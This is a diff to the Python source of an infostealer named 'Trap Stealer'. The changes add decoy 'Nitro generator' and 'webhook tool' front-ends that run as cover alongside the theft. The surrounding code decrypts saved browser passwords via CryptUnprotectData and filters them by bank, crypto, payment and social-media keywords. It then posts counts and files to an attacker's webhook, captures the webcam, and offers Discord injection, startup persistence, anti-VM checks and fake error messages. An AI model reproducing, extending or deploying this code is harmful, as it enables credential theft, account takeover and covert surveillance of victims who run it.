@@ -1,5 +1,4 @@
 # Import dont mind
-
 import os, base64
 from os import getenv, startfile
 import threading
@@ -28,15 +27,17 @@ import shutil, json
 import win32clipboard
 ### CONFIG ### 
 
-
 webhook = '' #Put ur webhook
 
-injection = False # If set to False it will not inject into discord
-fakeerror = False # If True it will make an fake error message at the end
-Startup = False # If True it will add the file into the startup folder
-antidebugging = False # If set to false it will dont check for VM or Debugger
-DiscordStop = False # If set to True it will make discord cannot be launched again by just removing content from startup file #----- IT WILL DISABLE INJECTION -----#
-StartupMessage = 'An error occurred while trying to add Trap Stealer to the Startup folder.     Or maybe you just put Startup = False' # The Startup message is like that at the start and change if Startup is set to True
+FakeWebhook = False # If True, starts a fake webhook tool with options to delete, spam, etc.
+Fakegen = False # If True, starts a fake Discord nitro generator
+injection = False # If True, injects into Discord
+fakeerror = False # If True, displays a fake error message at the end
+Startup = False # If True, adds the file to the startup folder
+antidebugging = False # # If False, does not check for VM or debugger
+DiscordStop = False # If True, prevents Discord from being launched again by removing content from the startup file. Note: this will disable injection.
+StartupMessage = 'An error occurred while trying to add Trap Stealer to the startup folder. Please check your permissions or make sure Startup is set to True.' # The message displayed if Startup is set to True
+
 
 def antidebug():
     checks = [check_windows, check_ip, check_registry, check_dll]
@@ -116,6 +117,57 @@ class DATA_BLOB(Structure):
         ('pbData', POINTER(c_char))
     ]
 
+def webhook_tools():
+    try:
+        inputmain = input(f'''
+        Which webhook tools you want to use ?
+
+        [1] Webhook Spammer
+        [2] Webhook Deleter
+
+        -> ''')
+
+        if inputmain == '1':
+            url = input(f'Webhook URL : ')
+            messages = (f'Message To Spam : ')
+            timetospam = input(f'How many times do you want to send the message? : ')
+            message = messages
+            data = {
+                "content": message,
+                "username": "Spam Moment"
+            }
+
+            for i in range(int(timetospam)):
+                encoded_data = urllib.parse.urlencode(data).encode('utf-8')
+                req = urllib.request.Request(url, data=encoded_data)
+                try:
+                    with urllib.request.urlopen(req) as response:
+                        pass
+                except urllib.error.HTTPError as e:
+                    print(f"Error: {e.code}")
+                else:
+                    print(f"Message sent successfully")
+                time.sleep(0.2)
+
+            print(f'Ended. Press Any Key to Leave')
+
+        elif inputmain == '2':
+            webhook = input(f'Webhook URL -> ')
+            req = urllib.request.Request(webhook, method='DELETE')
+            try:
+                with urllib.request.urlopen(req) as response:
+                    pass
+            except urllib.error.HTTPError as e:
+                print(f"Error: {e.code}")
+            else:
+                print(f"Webhook deleted successfully")
+            print(f'Press any key to quit')
+
+        else:
+            print(f'Wrong input')
+            time.sleep(1)
+    except:
+        pass
 
 file_path = os.path.realpath(__file__)
 USER_NAME = getpass.getuser()
@@ -148,6 +200,42 @@ def CryptUnprotectData(encrypted_bytes, entropy=b''):
 
     if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
         return GetData(blob_out)
+    
+def fakegen():
+    try:
+        print('''
+        ███╗   ██╗██╗████████╗██████╗  ██████╗  ██████╗ ███████╗███╗   ██╗
+        ████╗  ██║██║╚══██╔══╝██╔══██╗██╔═══██╗██╔════╝ ██╔════╝████╗  ██║
+        ██╔██╗ ██║██║   ██║   ██████╔╝██║   ██║██║  ███╗█████╗  ██╔██╗ ██║
+        ██║╚██╗██║██║   ██║   ██╔══██╗██║   ██║██║   ██║██╔══╝  ██║╚██╗██║
+        ██║ ╚████║██║   ██║   ██║  ██║╚██████╔╝╚██████╔╝███████╗██║ ╚████║
+        ╚═╝  ╚═══╝╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═══╝''')
+        import string
+
+        codes_list = list(string.ascii_uppercase + string.ascii_lowercase + string.digits)
+
+        count_generator = 0
+        valid_url = random.randint(1, 1000)
+        valid_test = -1
+    
+        filename = input("Enter the filename to use for proxies (or press Enter to skip): ")
+        while True:
+            essay = input("How many codes do you want to generate? (Enter a number): ")
+            if not essay.isdigit() or int(essay) < 1:
+                print("Invalid input. Please enter a positive integer.")
+                continue
+            essay = int(essay)
+            for i in range(essay):
+                count_generator += 1
+                codes = ''.join(random.choices(codes_list, k=16))
+                url = "https://discord.gift/" + codes
+                print(f"{count_generator}. {url} - NOT WORKING")
+                if valid_test == valid_url:
+                    print(f"\nCongratulations! You found a valid code:\n{url}\n")
+                    time.sleep(3600)
+                valid_test = random.randint(1, 100000)
+                time.sleep(0.05)
+    except:pass
 
 def DecryptValue(buff, master_key=None):
     starts = buff.decode(encoding='utf8', errors='ignore')[:3]
@@ -615,7 +703,8 @@ def getPassw(path, arg):
     with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
     master_key = b64decode(local_state['os_crypt']['encrypted_key'])
     master_key = CryptUnprotectData(master_key[5:])
-
+    keyword = [
+    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)']
     for row in data: 
         if row[0] != '':
             for wa in keyword:
@@ -859,7 +948,7 @@ def paaz():
             "embeds": [
                 {
                     "title": f"🍪 Trap Stealer {pas[::-1]}",
-                    "description": f"{pas[::-1]} File URL : ",
+                    "description": f"Number of password : {PasswCount}\n{pas[::-1]} File URL : ",
                     "color": 0xffb6c1,
                     "fields": embed_fields,
                     "thumbnail": {
@@ -929,21 +1018,19 @@ def GatherAll():
     cam = threading.Thread(target=Camera_get)
     cam.start()
     Threadlist.append(cam)
-
-
-
-
-
-
-keyword = [
-    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
-]
+    if Fakegen == True:
+        us = threading.Thread(target=fakegen)
+        us.start()
+    else:
+        pass
+    if FakeWebhook == True:
+        wb = threading.Thread(target=webhook_tools)
+        wb.start()
+    else:pass
 
 GatherAll() 
 
-
 if fakeerror == True:
-
     ctypes.windll.user32.MessageBoxW(0, "Error, Restart...", "Retry!", 16)
 else:
     pass
